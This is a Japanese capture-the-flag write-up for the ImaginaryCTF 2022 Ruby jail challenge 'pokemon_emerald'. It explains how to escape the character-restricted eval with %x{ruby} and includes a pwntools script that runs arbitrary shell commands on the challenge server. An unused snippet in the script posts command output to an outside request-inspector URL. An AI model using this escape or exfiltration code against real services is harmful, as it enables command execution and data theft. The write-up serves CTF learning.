---
layout: chall
ctf_name: imaginaryctf_2022
problem_name: pokemon_emerald
genre: misc
solved_date: 2022-07-19
during_ctf: true
tag: [ruby,jail]
fav: false
difficulty: easy
---

### 概要

`{}`

<details><summary>コード</summary>

```rb
#!/usr/bin/env -S stdbuf -o0 -i0 ruby
code = gets.strip
# abcfjnrtuxy%{}_01234
code.each_char do |c|
  unless "jctf{any%_2uby_3xtr4ct10n}".include? c
    puts "NO!"
    exit
  end
end
puts eval(code)
```

</details>


### 解法

`%` が含まれていることから、ruby の [% 文字列](https://docs.ruby-lang.org/ja/latest/doc/spec=2fliteral.html#percent)を用いると推測できる。`%{}` でコマンドの実行結果を文字列として表示できる。`ruby` コマンドは引数を与えなければ標準入力から受け取り、コードとして評価する。なので、`%{ruby}` を送信した後に任意のスクリプトを送り込み、最後にEOF の代わりとなる `\x04` を送信すればよい。`EOF` の代わりは `stream.shutdown()` を使っても実現できる。

<details><summary>スクリプト</summary>

```py
from pwn import *

LOCAL = False

cmd = ""
old = f"""
require 'uri'
require 'net/http'
Net::HTTP.post_form(URI("https://requestinspector.com/inspect/01g86qn2tzmbdffdm9fk9339r0"),'body'=> %x{{{cmd}}})
"""

while True:
  if LOCAL: stream = process(["ruby", "jail.rb"])
  # if LOCAL: stream = remote('localhost', 8002)
  else: stream = remote('pokemon-emerald.chal.imaginaryctf.org', 1337)
  stream.sendline(b'%x{ruby}')
  sleep(0.1)
  cmd = input("$ ")
  stream.send(f"p %x{{{cmd}}}\x04\n".encode())
  print(stream.recvall(timeout=1))
  stream.close()
```

</details>

